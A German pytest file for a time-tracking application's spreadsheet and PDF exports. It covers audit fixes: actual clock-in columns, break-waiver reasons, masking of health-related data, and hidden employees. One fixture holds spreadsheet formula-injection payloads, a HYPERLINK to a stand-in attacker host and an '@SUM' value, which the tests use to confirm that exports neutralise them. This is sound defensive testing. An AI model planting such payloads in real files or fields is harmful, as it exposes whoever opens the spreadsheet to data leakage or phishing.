"""Audit 2026-11-07 (#541, #539) — §16-Datei-Exporte.

* A2-4: die Dateien zeigten nur die ANGERECHNETEN Von/Bis. Wann jemand wirklich
  kam und ging, wie lange er anwesend war (über 10 h?) und mit welcher
  Begründung eine § 4-Pause ausfiel, stand in keiner Datei. Jetzt angehängt:
  XLSX/ODS Spalten 14–16 (Monat + Jahres-Mitarbeiterblatt), PDF 13. Spalte +
  „§4-Ausnahme: …" in „Bemerkung".
* S2-7: der Formelschutz stellte ein sichtbares ``'`` vor Namen und Notizen
  („- Termin" → „'- Termin"). Jetzt schützt der Zelltyp; Formeln bleiben
  unmöglich.
* A2-11/S2-12: das Kennzeichen „Nachtarbeitnehmer" stand im XLSX-Monat und im
  PDF immer, in den übrigen Dateien nur mit Gesundheitsdaten — eine Regel für
  alle. Die Maskierung der Abwesenheiten (Krank + eigene Gründe, nicht
  Sonstiges/bezahlte Freistellung) ist in allen drei Exportern gleich.
* A2-6: ausgeblendete Mitarbeitende fehlten ohne Ausweg in jedem Export.
"""
import re
import zipfile
from datetime import date, time
from io import BytesIO

import pytest
from fastapi.testclient import TestClient
from openpyxl import load_workbook

from app.database import get_db
from app.middleware.auth import get_current_user, require_admin
from app.models import Absence, AbsenceType, TimeEntry, User, UserRole
from app.services import auth_service, export_service, ods_export_service
from tests.conftest import DEFAULT_TENANT_ID
from tests.test_497_498_export_day_rows import (
    MONTH, YEAR, _as_date, _ods_day_rows, _ods_header, _ods_table, _pdf_main_table,
)

K7_DAY = date(2026, 9, 7)       # Mo — gekappt, Rohstempel 07:00–19:00 (12 h)
PLAIN_DAY = date(2026, 9, 8)    # Di — 08:00–16:30, 30 Min. Pause
EMPTY_DAY = date(2026, 9, 9)    # Mi — nichts erfasst
SPLIT_DAY = date(2026, 9, 10)   # Do — zwei Einträge, Pausenausnahme
K15_DAY = date(2026, 9, 14)     # Mo — automatisch geschlossen
WAIVER = "Notfallpatient, Pause nicht möglich"

HEADERS_1_TO_13 = [
    "Datum", "Wochentag", "Von", "Bis", "Pause (Min)", "Netto (Std)", "Soll (Std)", "Differenz",
    "Abwesenheit", "Bemerkung", "Unterbrechung (Min)", "Zeiteinträge", "Nicht angerechnet (Min)",
]
NEW_HEADERS = ["Gestempelt (Von–Bis)", "Anwesenheit laut Stempel (Std)", "Pausenausnahme (§4 ArbZG)"]


def _te(db, user, d, start, end, **kw):
    e = TimeEntry(user_id=user.id, tenant_id=DEFAULT_TENANT_ID, date=d, start_time=start,
                  end_time=end, break_minutes=kw.pop("break_minutes", 0), **kw)
    db.add(e)
    db.commit()
    return e


@pytest.fixture
def stamps(db, test_user):
    _te(db, test_user, K7_DAY, time(7, 45), time(18, 15), raw_start_time=time(7),
        raw_end_time=time(19), uncredited_minutes=150, clamp_grace_minutes=15)
    _te(db, test_user, PLAIN_DAY, time(8), time(16, 30), break_minutes=30)
    _te(db, test_user, SPLIT_DAY, time(13), time(17), break_waiver_reason=WAIVER)
    _te(db, test_user, SPLIT_DAY, time(7), time(12), break_waiver_reason=WAIVER)
    _te(db, test_user, K15_DAY, time(8), time(18, 15), raw_end_time=time(23, 59),
        uncredited_minutes=150, auto_closed=True)
    return test_user


# --- A2-4: Helfer -----------------------------------------------------------

def test_day_stamps_helper():
    k7 = TimeEntry(start_time=time(7, 45), end_time=time(18, 15), raw_start_time=time(7),
                   raw_end_time=time(19), break_minutes=0, uncredited_minutes=150)
    s = export_service.day_stamps([k7])
    assert s == export_service.DayStamps("07:00–19:00", 720, True, "")

    auto = TimeEntry(start_time=time(8), end_time=time(18, 15), raw_end_time=time(23, 59),
                     break_minutes=0, auto_closed=True)
    # P18: 23:59 ist kein Stempel — es gilt das wirksame Ende, mit Vermerk.
    assert export_service.day_stamps([auto]).spans == "08:00–18:15 (automatisch geschlossen)"

    late = TimeEntry(start_time=time(13), end_time=None, break_minutes=0, break_waiver_reason=" B ")
    early = TimeEntry(start_time=time(7), end_time=time(12), break_minutes=30, break_waiver_reason="B")
    s = export_service.day_stamps([late, early])
    assert s.spans == "07:00–12:00, 13:00–offen"  # chronologisch, offener Eintrag zählt 0
    assert s.presence_minutes == 270
    assert s.over_limit is False
    assert s.break_waiver == "B"  # gleiche Begründung nur einmal

    exactly_10h = TimeEntry(start_time=time(7), end_time=time(17), break_minutes=0)
    assert export_service.day_stamps([exactly_10h]).over_limit is False  # erst ÜBER 10 h
    assert export_service.day_stamps([]) == export_service.DayStamps("", None, False, "")


# --- A2-4: XLSX ---------------------------------------------------------------

def _xlsx_sheet(bio, user, yearly):
    bio.seek(0)
    wb = load_workbook(bio)
    return wb[user.last_name[:20] if yearly else f"{user.last_name} {user.first_name}"[:31]]


def _xlsx_header(sheet):
    for r in sheet.iter_rows(max_col=20):
        if r[0].value == "Datum":
            return [c.value for c in r if c.value is not None]
    raise AssertionError("Kopfzeile fehlt")


def _xlsx_cells(sheet):
    rows = {}
    for r in sheet.iter_rows(min_col=1, max_col=16):
        d = _as_date(r[0].value)
        if isinstance(d, date):
            rows[d] = r
    return rows


@pytest.mark.parametrize("yearly", [False, True])
def test_xlsx_appends_stamp_columns(db, stamps, yearly):
    if yearly:
        bio = export_service.generate_yearly_report(db, YEAR, tenant_id=DEFAULT_TENANT_ID)
    else:
        bio = export_service.generate_monthly_report(db, YEAR, MONTH, tenant_id=DEFAULT_TENANT_ID)
    sheet = _xlsx_sheet(bio, stamps, yearly)
    header = _xlsx_header(sheet)
    assert header[:13] == HEADERS_1_TO_13, "Spalten 1–13 bleiben, wo sie sind"
    assert header[13:] == NEW_HEADERS

    rows = _xlsx_cells(sheet)
    k7 = rows[K7_DAY]
    assert (k7[2].value, k7[3].value) == ("07:45", "18:15")  # angerechnet, unverändert
    assert k7[13].value == "07:00–19:00"
    assert k7[14].value == 12.0
    assert k7[14].font.color.rgb.endswith("8B0000") and k7[14].font.bold  # > 10 h markiert
    assert k7[15].value is None

    plain = rows[PLAIN_DAY]
    assert (plain[13].value, plain[14].value) == ("08:00–16:30", 8.0)
    assert not plain[14].font.bold

    split = rows[SPLIT_DAY]
    assert split[13].value == "07:00–12:00, 13:00–17:00"
    assert split[14].value == 9.0
    assert split[15].value == WAIVER

    assert rows[K15_DAY][13].value == "08:00–18:15 (automatisch geschlossen)"
    assert rows[K15_DAY][14].value == 10.25
    assert all(c.value is None for c in rows[EMPTY_DAY][13:16])


def test_xlsx_weekend_fill_reaches_new_columns(db, stamps):
    bio = export_service.generate_monthly_report(db, YEAR, MONTH, tenant_id=DEFAULT_TENANT_ID)
    sheet = _xlsx_sheet(bio, stamps, False)
    saturday = _xlsx_cells(sheet)[date(2026, 9, 5)]
    assert saturday[15].fill.start_color.rgb.endswith("E8E8E8")


# --- A2-4: ODS ----------------------------------------------------------------

@pytest.mark.parametrize("yearly", [False, True])
def test_ods_appends_stamp_columns(db, stamps, yearly):
    if yearly:
        bio = ods_export_service.generate_yearly_report(db, YEAR, tenant_id=DEFAULT_TENANT_ID)
    else:
        bio = ods_export_service.generate_monthly_report(db, YEAR, MONTH, tenant_id=DEFAULT_TENANT_ID)
    table = _ods_table(bio, f"{stamps.last_name} {stamps.first_name}")
    header = _ods_header(table)
    assert header[:13] == HEADERS_1_TO_13
    assert header[13:16] == NEW_HEADERS
    rows = _ods_day_rows(table)
    assert rows[K7_DAY][13][0] == "07:00–19:00"
    assert float(rows[K7_DAY][14][1]) == 12.0
    assert rows[SPLIT_DAY][15][0] == WAIVER
    assert rows[K15_DAY][13][0] == "08:00–18:15 (automatisch geschlossen)"
    assert rows[EMPTY_DAY][13][0] == "" and not rows[EMPTY_DAY][14][1]


def test_ods_marks_presence_over_10h_bold(db, stamps):
    from odf.table import TableRow, TableCell
    from odf.teletype import extractText
    bio = ods_export_service.generate_monthly_report(db, YEAR, MONTH, tenant_id=DEFAULT_TENANT_ID)
    table = _ods_table(bio, f"{stamps.last_name} {stamps.first_name}")
    styles = {}
    for tr in table.getElementsByType(TableRow):
        cells = tr.getElementsByType(TableCell)
        if cells and extractText(cells[0]) in (K7_DAY.strftime("%d.%m.%Y"), PLAIN_DAY.strftime("%d.%m.%Y")):
            styles[extractText(cells[0])] = cells[14].getAttribute("stylename")
    assert styles[K7_DAY.strftime("%d.%m.%Y")] == "Bold"
    assert styles[PLAIN_DAY.strftime("%d.%m.%Y")] != "Bold"


# --- A2-4: PDF ----------------------------------------------------------------

def test_pdf_shows_stamps_and_waiver(db, stamps, monkeypatch):
    header, rows = _pdf_main_table(db, monkeypatch)
    assert header[12] == "Gestempelt (Anwesenheit)"
    k7 = rows[K7_DAY][12]
    assert "07:00–19:00" in k7 and "12:00 h" in k7 and "#8B0000" in k7  # > 10 h rot
    assert "#8B0000" not in rows[PLAIN_DAY][12] and "8:00 h" in rows[PLAIN_DAY][12]
    assert "07:00–12:00<br/>13:00–17:00" in rows[SPLIT_DAY][12]
    assert "automatisch geschlossen" in rows[K15_DAY][12]
    assert rows[EMPTY_DAY][12] == ""
    assert f"§4-Ausnahme: {WAIVER}" in rows[SPLIT_DAY][10]


def test_pdf_keeps_waiver_on_a_day_with_an_absence(db, test_user, monkeypatch):
    _te(db, test_user, PLAIN_DAY, time(7), time(13, 30), break_waiver_reason=WAIVER)
    db.add(Absence(user_id=test_user.id, tenant_id=DEFAULT_TENANT_ID, date=PLAIN_DAY,
                   type=AbsenceType.OTHER, hours=1.5, note="Behörde"))
    db.commit()
    _, rows = _pdf_main_table(db, monkeypatch)
    assert f"§4-Ausnahme: {WAIVER}" in rows[PLAIN_DAY][10]
    assert "Behörde" in rows[PLAIN_DAY][10]


# --- S2-7: Formelschutz ohne sichtbares Apostroph ------------------------------

HOSTILE = '=HYPERLINK("http://evil.invalid/?x","ok")'


@pytest.fixture
def hostile(db, test_user):
    test_user.first_name = "-Anna"
    db.commit()
    _te(db, test_user, PLAIN_DAY, time(8), time(12), note="- Termin")
    _te(db, test_user, K7_DAY, time(8), time(12), note=HOSTILE, break_waiver_reason="@SUM(A1) Grund")
    return test_user


def _sheet_xml(bio):
    bio.seek(0)
    with zipfile.ZipFile(bio) as z:
        return [z.read(n).decode() for n in z.namelist() if n.startswith("xl/worksheets/")]


@pytest.mark.parametrize("gen", [
    lambda db: export_service.generate_monthly_report(db, YEAR, MONTH, tenant_id=DEFAULT_TENANT_ID),
    lambda db: export_service.generate_yearly_report(db, YEAR, tenant_id=DEFAULT_TENANT_ID),
    lambda db: export_service.generate_yearly_report_classic(db, YEAR, tenant_id=DEFAULT_TENANT_ID),
])
def test_xlsx_writes_no_formula_and_no_visible_apostrophe(db, hostile, gen):
    bio = gen(db)
    for xml in _sheet_xml(bio):
        assert "<f>" not in xml and "<f " not in xml, "keine Formelzelle im Export"
    bio.seek(0)
    wb = load_workbook(bio)
    risky = [c for ws in wb.worksheets for r in ws.iter_rows() for c in r
             if isinstance(c.value, str) and c.value[:1] in "=+-@\t\r"]
    assert risky, "Testdaten müssen formelartige Texte enthalten"
    for c in risky:
        assert (c.data_type, c.quotePrefix) == ("s", True), (c.coordinate, c.value)
    texts = [c.value for ws in wb.worksheets for r in ws.iter_rows() for c in r if isinstance(c.value, str)]
    assert not any(t.startswith("'") for t in texts), "kein sichtbares Apostroph"


def test_xlsx_monthly_keeps_text_verbatim(db, hostile):
    bio = export_service.generate_monthly_report(db, YEAR, MONTH, tenant_id=DEFAULT_TENANT_ID)
    sheet = _xlsx_sheet(bio, hostile, False)
    rows = _xlsx_cells(sheet)
    assert rows[PLAIN_DAY][9].value == "- Termin"
    assert rows[K7_DAY][9].value == HOSTILE
    assert rows[K7_DAY][15].value == "@SUM(A1) Grund"
    assert sheet.cell(row=1, column=2).value == "-Anna User"


def test_harden_text_cells_catches_cells_without_neutralize():
    """Die Sperre hängt nicht an jeder Aufrufstelle: auch eine Zelle, die ohne
    neutralize_spreadsheet_formula beschrieben wurde, wird Textzelle."""
    from openpyxl import Workbook
    wb = Workbook()
    ws = wb.active
    ws["A1"] = "=1+1"
    ws["A2"] = "harmlos"
    ws["A3"] = 5
    export_service.harden_text_cells(wb)
    assert (ws["A1"].data_type, ws["A1"].quotePrefix) == ("s", True)
    assert ws["A2"].quotePrefix is False
    assert ws["A3"].data_type == "n"


@pytest.mark.parametrize("gen", [
    lambda db: ods_export_service.generate_monthly_report(db, YEAR, MONTH, tenant_id=DEFAULT_TENANT_ID),
    lambda db: ods_export_service.generate_yearly_report(db, YEAR, tenant_id=DEFAULT_TENANT_ID),
    lambda db: ods_export_service.generate_yearly_report_classic(db, YEAR, tenant_id=DEFAULT_TENANT_ID),
])
def test_ods_writes_no_formula_and_no_visible_apostrophe(db, hostile, gen):
    bio = gen(db)
    bio.seek(0)
    with zipfile.ZipFile(bio) as z:
        content = z.read("content.xml").decode()
    assert "table:formula" not in content
    assert "&apos;-" not in content and "'- Termin" not in content and "'=HYPERLINK" not in content
    # Texte beginnend mit = stehen nur in Textzellen
    for m in re.finditer(r"<table:table-cell([^>]*)><text:p>=HYPERLINK", content):
        assert 'office:value-type="string"' in m.group(1)


# --- A2-11 / S2-12: Maskierung -------------------------------------------------

def test_night_worker_flag_rule():
    u = User(is_night_worker=True)
    assert export_service.night_worker_export_value(u, False) == "–"
    assert export_service.night_worker_export_value(u, True) == "Ja"
    assert export_service.night_worker_export_value(User(is_night_worker=False), True) == "Nein"


@pytest.mark.parametrize("health", [False, True])
def test_night_worker_flag_same_in_every_exporter(db, test_user, monkeypatch, health):
    test_user.is_night_worker = True
    db.commit()
    _te(db, test_user, PLAIN_DAY, time(8), time(12))
    expected = "Ja" if health else "–"

    month = _xlsx_sheet(export_service.generate_monthly_report(
        db, YEAR, MONTH, health, tenant_id=DEFAULT_TENANT_ID), test_user, False)
    assert month.cell(row=2, column=5).value == expected  # vorher immer „Ja"
    year = _xlsx_sheet(export_service.generate_yearly_report(
        db, YEAR, health, tenant_id=DEFAULT_TENANT_ID), test_user, True)
    assert year.cell(row=2, column=5).value == expected

    import reportlab.platypus as rp
    texts = []
    orig = rp.Paragraph

    class _Spy(orig):
        def __init__(self, text, *a, **kw):
            texts.append(text)
            super().__init__(text, *a, **kw)

    monkeypatch.setattr(rp, "Paragraph", _Spy)
    export_service.generate_monthly_report_pdf(db, YEAR, MONTH, health, tenant_id=DEFAULT_TENANT_ID)
    meta = next(t for t in texts if "h/Woche" in t)
    assert ("Nachtarbeitnehmer" in meta) is health  # vorher immer im PDF


def test_absence_masking_same_in_every_exporter(db, test_user, monkeypatch):
    """S2-12: Krank maskiert, Sonstiges/bezahlte Freistellung im Klartext
    (Produktentscheidung, _absence_export_label) — in XLSX, ODS und PDF gleich."""
    sick, other, paid = date(2026, 9, 15), date(2026, 9, 16), date(2026, 9, 17)
    for d, t in ((sick, AbsenceType.SICK), (other, AbsenceType.OTHER), (paid, AbsenceType.PAID_LEAVE)):
        db.add(Absence(user_id=test_user.id, tenant_id=DEFAULT_TENANT_ID, date=d, type=t, hours=8.0,
                       note="Diagnose X" if t == AbsenceType.SICK else None))
    db.commit()

    rows = _xlsx_cells(_xlsx_sheet(export_service.generate_monthly_report(
        db, YEAR, MONTH, tenant_id=DEFAULT_TENANT_ID), test_user, False))
    xlsx = {d: (rows[d][8].value, rows[d][9].value) for d in (sick, other, paid)}
    ods_rows = _ods_day_rows(_ods_table(ods_export_service.generate_monthly_report(
        db, YEAR, MONTH, tenant_id=DEFAULT_TENANT_ID), f"{test_user.last_name} {test_user.first_name}"))
    ods = {d: (ods_rows[d][8][0], ods_rows[d][9][0]) for d in (sick, other, paid)}
    _, pdf_rows = _pdf_main_table(db, monkeypatch)
    pdf = {d: (pdf_rows[d][9], pdf_rows[d][10]) for d in (sick, other, paid)}

    for src in (xlsx, ods, pdf):
        assert src[sick][0].startswith("Abwesenheit") and "Diagnose" not in (src[sick][1] or "")
        assert src[other][0].startswith("Sonstiges")
        assert src[paid][0].startswith("Bez. Freistellung")


# --- A2-6: ausgeblendete Mitarbeitende -----------------------------------------

@pytest.fixture
def hidden_user(db, default_tenant):
    u = User(username="chefin", email="chefin@example.com",
             password_hash=auth_service.hash_password("testpassword123"),
             first_name="Clara", last_name="Chefin", role=UserRole.EMPLOYEE, weekly_hours=40.0,
             vacation_days=30, work_days_per_week=5, is_active=True, is_hidden=True,
             tenant_id=DEFAULT_TENANT_ID)
    db.add(u)
    db.commit()
    db.refresh(u)
    _te(db, u, PLAIN_DAY, time(8), time(16))
    return u


def test_export_users_hidden_only_on_request(db, test_user, hidden_user):
    period = (date(YEAR, MONTH, 1), date(YEAR, MONTH, 30))
    ids = {u.id for u in export_service.export_users(db, DEFAULT_TENANT_ID, *period)}
    assert hidden_user.id not in ids and test_user.id in ids
    ids = {u.id for u in export_service.export_users(db, DEFAULT_TENANT_ID, *period, include_hidden=True)}
    assert hidden_user.id in ids
    assert export_service.hidden_users_with_data_count(db, DEFAULT_TENANT_ID, *period) == 1
    assert export_service.hidden_users_with_data_count(db, DEFAULT_TENANT_ID, date(2026, 1, 1), date(2026, 1, 31)) == 0


def test_inactive_hidden_user_needs_data_in_period(db, hidden_user):
    hidden_user.is_active = False
    db.commit()
    ids = {u.id for u in export_service.export_users(
        db, DEFAULT_TENANT_ID, date(2026, 1, 1), date(2026, 1, 31), include_hidden=True)}
    assert hidden_user.id not in ids
    ids = {u.id for u in export_service.export_users(
        db, DEFAULT_TENANT_ID, date(YEAR, MONTH, 1), date(YEAR, MONTH, 30), include_hidden=True)}
    assert hidden_user.id in ids


def _client(db, admin):
    from tests.test_paid_leave_reports import _app

    def override_db():
        yield db

    _app.dependency_overrides[get_db] = override_db
    _app.dependency_overrides[get_current_user] = lambda: admin
    _app.dependency_overrides[require_admin] = lambda: admin
    return _app, TestClient(_app)


@pytest.mark.parametrize("url,kind", [
    (f"/api/admin/reports/export?month={YEAR}-{MONTH:02d}", "xlsx"),
    (f"/api/admin/reports/export-yearly?year={YEAR}", "xlsx"),
    (f"/api/admin/reports/export-yearly-classic?year={YEAR}", "xlsx"),
    (f"/api/admin/reports/export-ods?month={YEAR}-{MONTH:02d}", "ods"),
    (f"/api/admin/reports/export-yearly-ods?year={YEAR}", "ods"),
    (f"/api/admin/reports/export-yearly-classic-ods?year={YEAR}", "ods"),
    (f"/api/admin/reports/export-pdf?month={YEAR}-{MONTH:02d}", "pdf"),
])
def test_export_endpoints_include_hidden_on_request(db, test_admin, hidden_user, url, kind):
    app, client = _client(db, test_admin)
    try:
        def has_hidden(params):
            r = client.get(url + params)
            assert r.status_code == 200, r.text
            if kind == "xlsx":
                return any("Chefin" in n for n in load_workbook(BytesIO(r.content)).sheetnames)
            if kind == "ods":
                with zipfile.ZipFile(BytesIO(r.content)) as z:
                    return "Chefin" in z.read("content.xml").decode()
            # PDF: jede Person beginnt auf einer eigenen Seite (PageBreak) —
            # die ausgeblendete Person bringt genau eine Seite mehr.
            return len(re.findall(rb"/Type /Page\b", r.content))

        if kind == "pdf":
            assert has_hidden("&include_hidden=true") == has_hidden("") + 1
            return
        assert has_hidden("") is False
        assert has_hidden("&include_hidden=true") is True
    finally:
        app.dependency_overrides.clear()
